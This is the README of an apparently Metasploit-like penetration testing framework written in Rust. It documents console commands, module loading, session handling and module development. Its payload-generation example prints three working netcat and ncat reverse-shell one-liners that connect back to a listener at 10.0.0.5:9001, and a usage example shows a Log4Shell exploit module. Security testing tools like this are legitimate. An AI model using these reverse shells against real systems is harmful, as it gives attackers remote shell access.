# Amatsumara Framework

<p align="center">
  <img src="AmatsumaraLogo.png" alt="Amatsumara Logo" width="400"/>
</p>

<p align="center">
  <strong>A penetration testing framework built in Rust</strong>
</p>

<p align="center">
  Modules compile as native shared libraries and load dynamically at runtime.
</p>

---

## Overview

Amatsumara is a penetration testing framework built for performance and safety. Modules are `.so` shared libraries loaded via C FFI -- add new capabilities by dropping a `.so` into the modules directory.

| | Count |
|---|---|
| Exploit Modules | 6 |
| Auxiliary Modules | 18 |
| Utility Modules | 1 |
| Post-Exploitation Modules | 2 |
| Payload Generators | 9 |

> **[Module Documentation](docs/MODULES.md)** — detailed options, usage examples, caveats, and references for every exploit and auxiliary module.

### Features

- **Dynamic Module Loading** -- `.so` modules loaded at runtime, no framework recompile needed
- **AutoLHOST** -- automatic VPN interface detection (tun0/tap0)
- **Tab Completion** -- commands, module names, options, subcommands
- **Session Management** -- open, background, interact, kill sessions across targets
- **Background Jobs** -- run listeners in the background with `-j`
- **Global Options** -- `setg LHOST` once, applies everywhere
- **Numbered Search** -- `search` results are numbered for quick `use 0` selection
- **Async Runtime** -- built on Tokio

---

## AutoLHOST

Amatsumara automatically detects your active VPN interface (tun0/tap0) and
populates LHOST when a module is loaded. No more running `ip a` before every
exploit. To disable: `set autolhost false`

---

## Installation

**Requirements:** Rust 1.70+, Linux x86_64

```bash
git clone https://github.com/lorsupra/Amatsumara-Framework.git
cd Amatsumara-Framework
cargo build --release
./target/release/amatsumara-console
```

---

## Commands

### Module Selection

| Command | Description |
|---|---|
| `search <term>` | Search modules by name/description. Results are numbered. |
| `use <name\|number>` | Select a module by name or search result number. |
| `info [name\|number]` | Show module details. No argument = current module. |
| `back` | Deselect current module. |

### Options

| Command | Description |
|---|---|
| `set <OPT> <val>` / `forge <OPT> <val>` | Set a module option. |
| `unset <OPT>` | Clear a module option. |
| `setg <OPT> <val>` | Set a global option (persists across modules). |
| `unsetg <OPT>` | Clear a global option. |
| `set autolhost <true\|false>` | Toggle automatic LHOST detection. |
| `options` | Show current module options. |

> Module options (`set`) override globals (`setg`), which override defaults.

### Execution

| Command | Description |
|---|---|
| `run` / `strike` | Execute the selected module. |
| `run -j` | Execute as a background job. |
| `check` | Run vulnerability check (if module supports it). |

### Sessions & Jobs

| Command | Description |
|---|---|
| `sessions -l` | List active sessions. |
| `sessions -i <id>` | Interact with a session. |
| `sessions -k <id\|all>` | Kill session(s). |
| `jobs` | List background jobs. |
| `kill <id>` | Kill a background job. |

Inside a session: `background` to return to console, `exit` to close.

### Display

| Command | Description |
|---|---|
| `show exploits\|auxiliary\|payloads\|post\|all` | List loaded modules by type. |
| `help` / `?` | Show help. |
| `banner` | Redisplay startup banner. |
| `exit` / `quit` | Exit framework. |

---

## Usage

### Exploit Workflow

```
amatsumara > search log4j

  #    Name                     Description
  -    ----                     -----------
  0    Apache Log4j RCE         Log4Shell JNDI injection (CVE-2021-44228)

amatsumara > use 0
[*] AutoLHOST: LHOST set to 10.10.14.5 (tun0)

amatsumara Apache Log4j RCE (exploit) > forge RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100

amatsumara Apache Log4j RCE (exploit) > strike
[*] Launching module: Apache Log4j RCE
```

### Multi-Handler with Global Options

```
amatsumara > setg LHOST 10.0.0.5
amatsumara > setg LPORT 4444

amatsumara > use Multi Handler
amatsumara Multi Handler (utility) > run -j
[*] Job 1 started in background

amatsumara > jobs
  Id    Name             Running
  --    ----             -------
  1     Multi Handler    12s
```

### Generating Payloads

```
amatsumara > use Unix Netcat Reverse TCP
amatsumara Unix Netcat Reverse TCP (payload) > forge LHOST 10.0.0.5
amatsumara Unix Netcat Reverse TCP (payload) > forge LPORT 9001
amatsumara Unix Netcat Reverse TCP (payload) > strike

[+] Netcat Reverse Shell Payload:
    Target: 10.0.0.5:9001

=== Option 1: Standard nc with mkfifo ===
mkfifo /tmp/ivnrm; nc 10.0.0.5 9001 0</tmp/ivnrm | /bin/sh >/tmp/ivnrm 2>&1; rm /tmp/ivnrm

=== Option 2: nc -e (traditional netcat) ===
nc -e /bin/sh 10.0.0.5 9001

=== Option 3: ncat (nmap netcat) ===
ncat 10.0.0.5 9001 -e /bin/sh
```

---

## Architecture

```
Amatsumara-Framework/
+-- amatsumara-api/        # C FFI types (ModuleVTable, ModuleInfo, etc.)
+-- amatsumara-core/       # Module loader, session manager, discovery
+-- amatsumara-console/    # Interactive REPL, tab completion
+-- kanayago/              # Payload generation engine
+-- modules/
|   +-- exploits/          # Exploit modules (.so + source)
|   +-- auxiliary/scanner/ # Scanner modules
|   +-- auxiliary/         # Standalone auxiliary modules
|   +-- utilities/         # Utility modules (handlers, etc.)
|   +-- post/              # Post-exploitation modules
|   +-- payloads/singles/  # Payload generators
+-- pattern-create/        # Buffer overflow pattern generator
+-- pattern-offset/        # Pattern offset finder
```

### Module Loading

1. Framework scans `modules/` recursively for `.so` files at startup
2. Loads each library, calls `amatsumara_module_init()` to get the VTable
3. Reads metadata via C FFI, indexes by name for search/selection
4. Drop a new `.so` into modules/ and restart -- it's discovered automatically

### Sessions

Exploit modules open TCP connections and write session metadata to `/tmp/amatsumara_sessions/`. The console takes ownership of the stream. Sessions persist independently -- background, interact later, or kill.

---

## Developing Modules

Each module is a standalone `cdylib` Rust crate exporting `amatsumara_module_init() -> *const ModuleVTable`.

```bash
mkdir -p modules/exploits/my_exploit/src
```

**Cargo.toml:**
```toml
[package]
name = "my_exploit"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
amatsumara-api = { path = "../../../amatsumara-api" }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
```

**src/lib.rs** -- see any existing module for the pattern. Key points:

- Use `amatsumara_api::CString` (repr(C)), not `std::ffi::CString`
- Static metadata strings with `CString` wrappers pointing to `.as_ptr()`
- Options passed as JSON `*const c_char`, parsed with `serde_json`
- Return `0` for success, non-zero for failure

**Build & deploy:**
```bash
cd modules/exploits/my_exploit
cargo build --release
cp target/release/libmy_exploit.so .
rm -rf target/
```

---

## Utilities

```bash
# Generate cyclic pattern for buffer overflow dev
./target/release/pattern-create -l 500

# Find offset of a pattern value
./target/release/pattern-offset -q 41386141
```

---

### Future

- Staged payloads (meterpreter-style agent)
- Resource scripts (batch command files)
- Database integration for target/loot tracking
- New exploit modules (added only after proper testing)

---

## Contributing

Areas of interest:

1. **Exploit Modules** -- new vulnerability implementations
2. **Protocol Libraries** -- SSH, SMB, RDP implementations
3. **Auxiliary Modules** -- scanners, brute forcers, enumerators
4. **Payloads** -- new types, staged payloads, encoders
5. **Testing** -- validation against vulnerable targets

## License

BSD-3-Clause
